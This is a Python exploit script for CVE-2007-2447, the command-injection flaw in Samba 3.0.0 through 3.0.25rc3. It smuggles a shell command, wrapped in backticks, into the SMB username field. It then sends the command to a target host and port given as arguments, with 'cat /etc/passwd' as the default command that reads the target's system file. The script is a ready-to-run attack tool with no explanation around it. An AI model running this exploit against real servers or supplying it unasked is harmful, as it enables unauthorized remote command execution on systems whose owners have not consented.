#!/usr/bin/python3

import os
try:
    from pwn import log
    import argparse
    from smb.SMBConnection import SMBConnection
except ImportError:
    os.system('/usr/bin/python3 -m pip install argparse pwn pysmb')
    
def exploit(command, rhost, rport):
    conn = SMBConnection(f'/=`nohup {command}`', '', '', '', '', use_ntlm_v2=False, sign_options=1, is_direct_tcp=True)
    try:
        r = conn.connect(rhost, rport, sock_family=2, timeout=60)
    except:
        log.success(f'Payload sent -> {command}')
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser('CVE-2007-2447: Samba 3.0.0 through 3.0.25rc3 Command Injection')
    parser.add_argument('--rhost', help='Target IP')
    parser.add_argument('--rport', help='Target port', type=int, default=445)
    parser.add_argument('-c', '--command', help='Command to execute', default='cat /etc/passwd')
    args = parser.parse_args()
    if args.rhost and args.rport and args.command:
        exploit(args.command, args.rhost, args.rport)
    else:
        log.error('Missing arguments!')